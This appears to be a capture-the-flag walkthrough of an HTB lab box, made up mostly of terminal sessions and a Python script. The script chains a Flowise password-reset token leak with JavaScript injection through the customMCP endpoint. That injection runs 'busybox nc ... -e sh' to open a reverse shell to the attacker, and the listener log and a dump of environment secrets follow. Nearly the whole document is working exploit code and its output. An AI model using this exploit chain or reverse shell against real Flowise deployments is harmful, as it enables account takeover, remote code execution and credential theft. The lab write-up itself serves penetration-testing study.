
``` bash

❯ ip="10.129.92.31"

```

``` bash

❯ recon $ip
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-09 03:17 +0200
Nmap scan report for silenium.htb (10.129.92.31)
Host is up (0.036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 10.86 seconds
[*] First script done
[*] Open ports = '22,80'
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-09 03:17 +0200
Nmap scan report for silenium.htb (10.129.92.31)
Host is up (0.036s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.14 seconds
[*] Done
╭─ ~/hacking/ctf/htb/easy/silenium/recon                                                                     ✔ │ 25s ─╮
╰─                                                                                                                   ─╯

```


``` bash


❯ ffuf -u http://silentium.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.silentium.htb" -fs 178

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://silentium.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.silentium.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 46ms]
:: Progress: [10335/114442] :: Job [1/1] :: 1169 req/sec :: Duration: [0:00:09] :: Errors: 0 ::


```


``` bash

❯ echo "$ip staging.silentium.htb" | sudo tee -a /etc/hosts
10.129.92.31 staging.silentium.htb
╭─ ~/hacking/ctf/htb/easy/silenium/recon                                                                           ✔ ─╮
╰─                                                                                                                   ─╯


```


``` bash

❯ curl -X GET "http://staging.silentium.htb/api/v1/version"
{"version":"3.0.5"}

```



``` python

import requests

url = "http://staging.silentium.htb"
email = "ben@silentium.htb"
password = "Test123"

def change_password():

    headers = {'Content-Type': 'application/json'}

    data = {'user': {'email': email}}

    try:

        r = requests.post(url + "/api/v1/account/forgot-password", headers=headers, json=data, timeout=10)

        print("Status:", r.status_code)
        print("Response:", r.json())
        if r.status_code == 201:

            r_json = r.json()
            temp_token = r_json['user']['tempToken']

        data = {'user': {'email': email, 'tempToken': temp_token, "password": password}}

        r = requests.post(url + "/api/v1/account/reset-password", headers=headers, json=data, timeout=10)

        print("[+] Password changed")

    except Exception as e:

        print(f"[-] Error: {e}")

if __name__ == "__main__":

    change_password()

```



``` python

import requests

url = "http://staging.silentium.htb"
email = "ben@silentium.htb"
password = "Test123"
lhost = "10.10.14.3"
lport = "443"


def change_password():

    headers = {'Content-Type': 'application/json'}

    data = {'user': {'email': email}}

    try:

        r = requests.post(url + "/api/v1/account/forgot-password", headers=headers, json=data, timeout=10)

        print("Status:", r.status_code)
        print("Response:", r.json())
        if r.status_code == 201:

            r_json = r.json()
            temp_token = r_json['user']['tempToken']

        data = {'user': {'email': email, 'tempToken': temp_token, "password": password}}

        r = requests.post(url + "/api/v1/account/reset-password", headers=headers, json=data, timeout=10)

        print("[+] Password changed")

    except Exception as e:

        print(f"[-] Error: {e}")


def login():

     try:

         s = requests.Session()
         data = {"email": email, "password": password}
         headers = {"Content-Type": "application/json"}
         r = s.post(url + "/api/v1/auth/login", headers=headers, json=data, timeout=10)
         return s, r

     except Exception as e:

              print(f"Error: {e}")
def rce():

    session, response = login()
    print("Login:", response.status_code)

    cmd = f"busybox nc {lhost} {lport} -e sh"
    command = f'({{x:(function(){{const cp = process.mainModule.require("child_process");cp.execSync("{cmd}");return 1;}})()}})'

    data = {
        "loadMethod": "listActions",
        "inputs": {
            "mcpServerConfig": command
        }
    }
    session.headers.update({"x-request-from": "internal"})

    try:

        r = session.post(url + "/api/v1/node-load-method/customMCP", json=data, timeout=10)

        print("[+] Command executed")

        print(r.text)

    except requests.exceptions.Timeout:

               print("[+] Got it")

    except Exception as e:

               print(f"Error: {e}")



if __name__ == "__main__":

        change_password()
        rce()

```

``` bash

❯ sudo nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.92.34] 46689
python3 -c 'import pty; pty.spawn("/bin/sh")'
/ # hostname
hostname
c78c3cceb7ba
/ # whoami
whoami
root
/ #

```

``` bash

/ # env
env
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=4
PORT=3000
HOME=/root
OLDPWD=/dev
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/
SMTP_PASSWORD=r04D!!_R4ge
NVIDIA_NIM_LLM_MODE=managed
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test
/ #

```

``` bash

ben@silentium:~$ ss -tuln
Netid      State       Recv-Q      Send-Q           Local Address:Port              Peer Address:Port      Process
udp        UNCONN      0           0                   127.0.0.54:53                     0.0.0.0:*
udp        UNCONN      0           0                127.0.0.53%lo:53                     0.0.0.0:*
udp        UNCONN      0           0                      0.0.0.0:68                     0.0.0.0:*
tcp        LISTEN      0           4096                 127.0.0.1:3001                   0.0.0.0:*
tcp        LISTEN      0           4096                 127.0.0.1:3000                   0.0.0.0:*
tcp        LISTEN      0           4096                   0.0.0.0:22                     0.0.0.0:*
tcp        LISTEN      0           511                    0.0.0.0:80                     0.0.0.0:*
tcp        LISTEN      0           4096                 127.0.0.1:8025                   0.0.0.0:*
tcp        LISTEN      0           4096                 127.0.0.1:34255                  0.0.0.0:*
tcp        LISTEN      0           4096                127.0.0.54:53                     0.0.0.0:*
tcp        LISTEN      0           4096             127.0.0.53%lo:53                     0.0.0.0:*
tcp        LISTEN      0           4096                 127.0.0.1:1025                   0.0.0.0:*
tcp        LISTEN      0           4096                      [::]:22                        [::]:*
tcp        LISTEN      0           511                       [::]:80                        [::]:*
ben@silentium:~$


```




``` bash


ben@silentium:~$ find / -name "gogs" -type f 2>/dev/null
/opt/gogs/gogs/gogs
/opt/gogs/gogs/scripts/init/openbsd/gogs
/opt/gogs/gogs/scripts/init/debian/gogs
/opt/gogs/gogs/scripts/init/suse/gogs
/opt/gogs/gogs/scripts/init/freebsd/gogs
/opt/gogs/gogs/scripts/init/gentoo/gogs
/opt/gogs/gogs/scripts/init/centos/gogs
/opt/gogs/gogs/scripts/supervisor/gogs
^C
ben@silentium:~$ systemctl status gogs
● gogs.service - Gogs Git Service
     Loaded: loaded (/etc/systemd/system/gogs.service; enabled; preset: enabled)
     Active: active (running) since Wed 2026-09-09 02:38:11 UTC; 34min ago
   Main PID: 1476 (gogs)
      Tasks: 8 (limit: 4603)
     Memory: 89.5M (peak: 100.9M)
        CPU: 1.597s
     CGroup: /system.slice/gogs.service
             └─1476 /opt/gogs/gogs/gogs web

Warning: some journal files were not opened due to insufficient permissions.
ben@silentium:~$ /opt/gogs/gogs/gogs --version
Gogs version 0.13.3
ben@silentium:~$


```
